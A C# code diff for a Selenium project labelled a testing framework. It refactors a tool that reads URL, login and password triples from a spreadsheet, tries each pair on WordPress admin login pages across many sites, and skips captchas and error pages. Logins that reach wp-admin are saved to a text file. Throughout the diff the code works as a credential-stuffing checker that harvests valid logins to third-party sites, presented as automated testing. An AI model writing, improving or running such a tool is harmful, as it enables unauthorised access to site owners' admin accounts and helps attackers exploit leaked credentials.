@@ -10,6 +10,12 @@ using TestingFramework.Tests.WordPress;
 using System.Net;
 using RestSharp;
 using System.Collections.Generic;
+using FluentAssertions;
+using OpenQA.Selenium.Support.UI;
+using System.Collections.ObjectModel;
+using System.Linq;
+using System.Windows.Forms;
+using OpenQA.Selenium.Support.PageObjects;
 
 namespace TestingFramework
 {
@@ -19,10 +25,15 @@ namespace TestingFramework
     {
         ExcelFileReader ExcelReader = new ExcelFileReader();
         ReadersAndWritersToOrFromFile WriteAndReadHelper = new ReadersAndWritersToOrFromFile();
-        WordPressAdminLoginPage LoginPage = new WordPressAdminLoginPage();
+
+        ErrorsChecker ErrorChecker = new ErrorsChecker();
         string indexFileReaderPath = @"F:\qqqqqqqq\TestingFramework\IndexFileReader.txt";
-        string indexFileWriterPath = @"F:\qqqqqqqq\TestingFramework\IndexFileReader.txt";
         public string filePath = @"F:\qqqqqqqq\TestingFramework\all1.xlsx";
+        string indexFileWriterPath = @"F:\qqqqqqqq\TestingFramework\IndexFileReader.txt";
+        string driverPath = @"F:\qqqqqqqq\TestingFramework";
+        string text = null;
+        string readPath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
+        string writePath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
         string Url;
         string Login;
         string Password;
@@ -33,258 +44,98 @@ namespace TestingFramework
         public void DriverInitialization()
         {
             ChromeOptions options = new ChromeOptions();
-            options.AddArguments("--disable-extensions"); // to disable extension
-            options.AddArguments("--disable-notifications"); // to disable notification
-            options.AddArguments("--disable-application-cache"); // to disable cache
-
-            driver = new ChromeDriver(@"F:\qqqqqqqq\TestingFramework", options);
+            options.AddArguments("--disable-extensions");
+            options.AddArguments("--disable-notifications");
+            options.AddArguments("--disable-application-cache");
+            driver = new ChromeDriver(driverPath, options);
         }
 
-        public void WriteIndexToTheFile(int index)
+        [TearDown]
+        public void DriverExit()
         {
-            try
-            {
-                using (StreamWriter sw = new StreamWriter(indexFileWriterPath, false, System.Text.Encoding.Default))
-                {
-                    sw.Write(index);
-                }
-            }
-            catch (Exception e)
-            {
-                Console.WriteLine("Index was not saved");
-            }
-        }
-
-
-
-
-        public string CheckForNotAcceptableError()
-        {
-            try
-            {
-                var notAcceptable = driver.FindElement(By.XPath("html/body/h1[contains(text(),'Not Acceptable!')]"));
-                if (notAcceptable.Displayed)
-                {
-                    return "1";
-                }
-            }
-            catch (Exception e)
-            {
-                return e.ToString();
-            }
-            return null;
-        }
-
-        public string CheckForPageNotFoundError()
-        {
-            try
-            {
-                var pageNotFoundError = driver.FindElement(By.XPath("//span[@class='status-code'][contains(text(),'404')]"));
-                if (pageNotFoundError.Displayed)
-                {
-                    return "1";
-                }
-            }
-            catch (Exception e)
-            {
-                return e.ToString();
-            }
-            return null;
-        }
-
-        public string CheckForDomainError()
-        {
-
-
-            try
-            {
-                var pageNotFoundError = driver.FindElement(By.XPath("//p[contains(text(),'This domain has expired.')]"));
-                if (pageNotFoundError.Displayed)
-                {
-                    return "1";
-                }
-            }
-            catch (Exception e)
-            {
-                return e.ToString();
-            }
-            return null;
-        }
-
-        public string CheckFor2PageNotFoundError()
-        {
-            try
-            {
-                var pageNotFoundError = driver.FindElement(By.XPath("//h1[contains(text(),'404 Not Found')]"));
-                if (pageNotFoundError.Displayed)
-                {
-                    return "1";
-                }
-            }
-            catch (Exception e)
-            {
-                return e.ToString();
-            }
-            return null;
+            driver.Close();
         }
 
         [Test]
-        [Parallelizable(ParallelScope.Self)]
         public void LoginAndVerifyAsync()
         {
+            if (!File.Exists(filePath) || !File.Exists(indexFileReaderPath) || !File.Exists(indexFileWriterPath) || !File.Exists(readPath) || !File.Exists(writePath))
+                throw new FileNotFoundException("One of files listed above doesn't exists");
             var dataFromExcelFile = ExcelReader.ReadExcelFile(filePath);
-
-
             int indexFromFile = WriteAndReadHelper.ReadIndexFromFile(indexFileReaderPath);
             dataFromExcelFile.RemoveRange(0, indexFromFile);
-            //if (!indexFromFile.Equals(0))
-
-
-
             foreach (var field in dataFromExcelFile)
             {
                 try
                 {
-
-
-                    var test2 = field.Split(':');
-                    Url = "http://" + test2[0];
+                    var splittedArray = field.Split(':');
+                    Url = "http://" + splittedArray[0];
                     if (Url.Contains("#NA"))
                         continue;
-                    Login = test2[1];
-                    Password = test2[2];
-                    WriteIndexToTheFile(indexFromFile++);
+                    Login = splittedArray[1];
+                    Password = splittedArray[2];
+                    WriteAndReadHelper.WriteIndexToTheFile(indexFromFile++, indexFileWriterPath);
 
                     var client = new RestClient(Url);
                     var request = new RestRequest(Method.GET);
-                    var test22 = client.Execute(request);
-                    if (!test22.StatusCode.Equals(HttpStatusCode.OK))
-                    {
+                    var response = client.Execute(request);
+                    if (!response.StatusCode.Equals(HttpStatusCode.OK))
                         continue;
-                    }
-
-
-
-
 
                     driver.Navigate().GoToUrl(Url);
-
-                    if (driver.Url.Contains("robotcaptcha"))
                     {
-                        continue;
-                    }
+                        var isPage2NotFoundErrorPresent = ErrorChecker.CheckFor2PageNotFoundError(driver);
+                        var isPageNotFoundErrorPresent = ErrorChecker.CheckForPageNotFoundError(driver);
+                        var isDomainErrorsPresent = ErrorChecker.CheckForDomainError(driver);
+                        var isNotAcceptrableErrorPresent = ErrorChecker.CheckForNotAcceptableError(driver);
+                        var isSuspended = ErrorChecker.SuspendedPage(driver);
+                        var isRobotCaptcha = ErrorChecker.RobotCaptchaCheck(driver);
+                        var isPageNotLoaded = ErrorChecker.PageNotLoaded(driver);
+                        var wordpressSuggestion = ErrorChecker.WordPressSuggestion(driver);
+                        if (!wordpressSuggestion.IsNullOrEmpty())
+                            wordpressSuggestion.Click();
 
-                    var isDomainErrorsPresent = CheckForDomainError();
-                    var isPageNotFoundErrorPresent = CheckForPageNotFoundError();
-                    var isNotAcceptrableErrorPresent = CheckForNotAcceptableError();
-                    var isPage2NotFoundErrorPresent = CheckFor2PageNotFoundError();
-                    if (isPageNotFoundErrorPresent == "1" || isNotAcceptrableErrorPresent == "1" || isPage2NotFoundErrorPresent == "1" || isDomainErrorsPresent == "1")
-                    {
-                        continue;
-                    }
-                    if (driver.Url.Contains("suspendedpage"))
-                    {
-                        continue;
-                    }
-
-                    try
-                    {
-                        var pageNotLoaded = driver.FindElement(By.XPath("//div[@id='main-message']"));
-
-                        if (pageNotLoaded.Displayed)
-                        {
+                        if (isPage2NotFoundErrorPresent || isPageNotFoundErrorPresent || isDomainErrorsPresent || isNotAcceptrableErrorPresent || isNotAcceptrableErrorPresent || isSuspended || isRobotCaptcha || isPageNotLoaded)
                             continue;
-                        }
                     }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
+                    
+                    WordPressAdminLoginPage LoginPage = new WordPressAdminLoginPage();
+                    PageFactory.InitElements(driver, LoginPage);
+                    LoginPage.loginTextField.SendKeys(Login);
+                    LoginPage.passwordTextField.SendKeys(Password);
+                    LoginPage.loginButton.Click();
 
-                    try
                     {
-                        var wordPressSuggestion = driver.FindElement(By.XPath("//a[@class='jetpack-sso-toggle wpcom']"));
-                        if (wordPressSuggestion.Displayed)
-                        {
-                            wordPressSuggestion.Click();
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
+                        var isPage2NotFoundErrorPresent = ErrorChecker.CheckFor2PageNotFoundError(driver);
+                        var isPageNotFoundErrorPresent = ErrorChecker.CheckForPageNotFoundError(driver);
+                        var isDomainErrorsPresent = ErrorChecker.CheckForDomainError(driver);
+                        var isNotAcceptrableErrorPresent = ErrorChecker.CheckForNotAcceptableError(driver);
+                        var isSuspended = ErrorChecker.SuspendedPage(driver);
+                        var isRobotCaptcha = ErrorChecker.RobotCaptchaCheck(driver);
+                        var isPageNotLoaded = ErrorChecker.PageNotLoaded(driver);
+                        var wordpressSuggestion = ErrorChecker.WordPressSuggestion(driver);
+                        if (!wordpressSuggestion.IsNullOrEmpty())
+                            wordpressSuggestion.Click();
 
-                    try
-                    {
-                        var technicalDifficulties = driver.FindElement(By.XPath("//body[@id='error-page']/p[contains(text(), 'The site is experiencing technical difficulties. Please check your site admin email inbox for instructions.')]"));
-                        if (technicalDifficulties.Displayed)
-                        {
+                        if (isPage2NotFoundErrorPresent || isPageNotFoundErrorPresent || isDomainErrorsPresent || isNotAcceptrableErrorPresent || isNotAcceptrableErrorPresent || isSuspended || isRobotCaptcha || isPageNotLoaded)
                             continue;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-                    try
-                    {
-                        var forbidden = driver.FindElement(By.XPath("html/body/h1[contains(text(),'Forbidden')]"));
-                        if (forbidden.Displayed)
-                        {
-                            continue;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-
-
-                    var loginField = driver.FindElement(By.XPath("//input[@id='user_login']"));
-                    var passwordField = driver.FindElement(By.XPath("//input[@id='user_pass']"));
-                    var loginButton = driver.FindElement(By.XPath("//input[@id='wp-submit']"));
-
-                    loginField.SendKeys(Login);
-                    passwordField.SendKeys(Password);
-                    try
-                    {
-
-                        loginButton.Click();
-                    }
-                    catch (OpenQA.Selenium.WebDriverException e)
-                    {
-                        e.Message.Contains("timed out after 60 seconds.");
-                        continue;
-                    }
-
-                    isNotAcceptrableErrorPresent = CheckForNotAcceptableError();
-                    isPageNotFoundErrorPresent = CheckForPageNotFoundError();
-                    isPage2NotFoundErrorPresent = CheckFor2PageNotFoundError();
-                    if (isPageNotFoundErrorPresent == "1" || isNotAcceptrableErrorPresent == "1" || isPage2NotFoundErrorPresent == "1")
-                    {
-                        continue;
                     }
 
                     if (!driver.Url.Contains("wp-admin"))
                     {
-                        var loginError = driver.FindElement(By.XPath("//div[@id='login_error']"));
-
-                        if (loginError.Text.Contains("ERROR: Incorrect username or password") || loginError.Text.Contains("ERROR: Invalid username"))
+                        var isIncorrectPassword = ErrorChecker.IncorrectPassword(driver);
+                        if (!isIncorrectPassword.IsNullOrEmpty())
                         {
-                            continue;
+                            if (isIncorrectPassword.Text.Contains("ERROR: Incorrect username or password") || isIncorrectPassword.Text.Contains("ERROR: Invalid username"))
+                            {
+                                continue;
+                            }
+                            if (isIncorrectPassword.Displayed)
+                            {
+                                driver.Navigate().Refresh();
+                            }
                         }
-                        if (loginError.Displayed)
-                        {
-                            driver.Navigate().Refresh();
-                        }
-
                     }
-
-                    string text = null;
-                    string readPath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
-                    string writePath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
                     if (driver.Url.Contains("wp-admin"))
                     {
                         string newUrl = $"{Url};{Login};{Password}";
@@ -300,209 +151,24 @@ namespace TestingFramework
                         {
                             Console.WriteLine(e.Message);
                         }
-
                     }
-
-
-
-
                 }
-                catch (OpenQA.Selenium.WebDriverException e)
+                catch (Exception e)
                 {
-                    continue;
+                    if (e.Message.Contains("timed out after 60 seconds."))
+                    {
+                        SendKeys.SendWait(@"{Esc}");
+                        continue;
+                    }
+                    else
+                    {
+                        SendKeys.SendWait(@"{Esc}");
+                        continue;
+                    }
                 }
             }
-
-            //}
-
-
-
-        }
-
-        [Test]
-        [Parallelizable(ParallelScope.Self)]
-        public void MultiRun()
-        {
-            var dataFromExcelFile = ExcelReader.ReadExcelFile();
-
-
-            int indexFromFile = WriteAndReadHelper.ReadIndexFromFile(indexFileReaderPath);
-            dataFromExcelFile.RemoveRange(0, indexFromFile);
-            //if (!indexFromFile.Equals(0))
-
-
-
-            foreach (var field in dataFromExcelFile)
-            {
-                try
-                {
-
-
-                    var test2 = field.Split(':');
-                    Url = "http://" + test2[0];
-                    if (Url.Contains("#NA"))
-                        continue;
-                    Login = test2[1];
-                    Password = test2[2];
-                    WriteIndexToTheFile(indexFromFile++);
-
-                    var client = new RestClient(Url);
-                    var request = new RestRequest(Method.GET);
-                    var test22 = client.Execute(request);
-                    if (!test22.StatusCode.Equals(HttpStatusCode.OK))
-                    {
-                        continue;
-                    }
-
-
-
-
-
-                    driver.Navigate().GoToUrl(Url);
-
-                    if (driver.Url.Contains("robotcaptcha"))
-                    {
-                        continue;
-                    }
-
-                    var isDomainErrorsPresent = CheckForDomainError();
-                    var isPageNotFoundErrorPresent = CheckForPageNotFoundError();
-                    var isNotAcceptrableErrorPresent = CheckForNotAcceptableError();
-                    var isPage2NotFoundErrorPresent = CheckFor2PageNotFoundError();
-                    if (isPageNotFoundErrorPresent == "1" || isNotAcceptrableErrorPresent == "1" || isPage2NotFoundErrorPresent == "1" || isDomainErrorsPresent == "1")
-                    {
-                        continue;
-                    }
-                    if (driver.Url.Contains("suspendedpage"))
-                    {
-                        continue;
-                    }
-
-                    try
-                    {
-                        var pageNotLoaded = driver.FindElement(By.XPath("//div[@id='main-message']"));
-
-                        if (pageNotLoaded.Displayed)
-                        {
-                            continue;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-                    try
-                    {
-                        var wordPressSuggestion = driver.FindElement(By.XPath("//a[@class='jetpack-sso-toggle wpcom']"));
-                        if (wordPressSuggestion.Displayed)
-                        {
-                            wordPressSuggestion.Click();
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-                    try
-                    {
-                        var technicalDifficulties = driver.FindElement(By.XPath("//body[@id='error-page']/p[contains(text(), 'The site is experiencing technical difficulties. Please check your site admin email inbox for instructions.')]"));
-                        if (technicalDifficulties.Displayed)
-                        {
-                            continue;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-                    try
-                    {
-                        var forbidden = driver.FindElement(By.XPath("html/body/h1[contains(text(),'Forbidden')]"));
-                        if (forbidden.Displayed)
-                        {
-                            continue;
-                        }
-                    }
-                    catch (Exception e)
-                    {
-                        Console.WriteLine();
-                    }
-
-
-
-                    var loginField = driver.FindElement(By.XPath("//input[@id='user_login']"));
-                    var passwordField = driver.FindElement(By.XPath("//input[@id='user_pass']"));
-                    var loginButton = driver.FindElement(By.XPath("//input[@id='wp-submit']"));
-
-                    loginField.SendKeys(Login);
-                    passwordField.SendKeys(Password);
-                    try
-                    {
-
-                        loginButton.Click();
-                    }
-                    catch (OpenQA.Selenium.WebDriverException e)
-                    {
-                        e.Message.Contains("timed out after 60 seconds.");
-                        continue;
-                    }
-
-                    isNotAcceptrableErrorPresent = CheckForNotAcceptableError();
-                    isPageNotFoundErrorPresent = CheckForPageNotFoundError();
-                    isPage2NotFoundErrorPresent = CheckFor2PageNotFoundError();
-                    if (isPageNotFoundErrorPresent == "1" || isNotAcceptrableErrorPresent == "1" || isPage2NotFoundErrorPresent == "1")
-                    {
-                        continue;
-                    }
-
-                    if (!driver.Url.Contains("wp-admin"))
-                    {
-                        var loginError = driver.FindElement(By.XPath("//div[@id='login_error']"));
-
-                        if (loginError.Text.Contains("ERROR: Incorrect username or password") || loginError.Text.Contains("ERROR: Invalid username"))
-                        {
-                            continue;
-                        }
-                        if (loginError.Displayed)
-                        {
-                            driver.Navigate().Refresh();
-                        }
-
-                    }
-
-                    string text = null;
-                    string readPath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
-                    string writePath = @"F:\qqqqqqqq\TestingFramework\LoginsAndPasswords.txt";
-                    if (driver.Url.Contains("wp-admin"))
-                    {
-                        string newUrl = $"{Url};{Login};{Password}";
-                        try
-                        {
-                            var resultOfFileChecking = WriteAndReadHelper.WriteToFile(text, newUrl, readPath, writePath);
-                            if (resultOfFileChecking == "Url is already present")
-                            {
-                                continue;
-                            }
-                        }
-                        catch (Exception e)
-                        {
-                            Console.WriteLine(e.Message);
-                        }
-
-                    }
-
-
-
-
-                }
-                catch (OpenQA.Selenium.WebDriverException e)
-                {
-                    continue;
-                }
-            }
+            DriverExit();
         }
     }
 }
+
